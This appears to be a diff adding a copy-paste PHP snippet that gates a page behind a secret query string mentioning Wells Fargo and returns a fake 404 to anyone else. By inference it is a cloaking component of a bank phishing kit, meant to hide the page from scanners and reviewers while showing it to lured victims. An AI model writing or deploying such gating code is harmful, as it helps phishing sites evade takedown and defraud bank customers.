@@ -1,0 +1,24 @@
+
+//copy start here
+
+
+$fuck1 = ('auth');
+$fuck2 = ('?client=opera&q=wells+fargo');
+
+
+session_start();
+if (($_SESSION['redirected'] ?? null) !== true) {
+    if ($_GET[$fuck1] === ($fuck2)) {
+        $_SESSION['redirected'] = true;
+        header('Refresh: 0');
+        exit();
+    }
+    else {
+        header('HTTP/1.0 404 Not Found', true, 404);
+        exit();
+    }
+} 
+session_destroy();
+
+
+//copy ends here
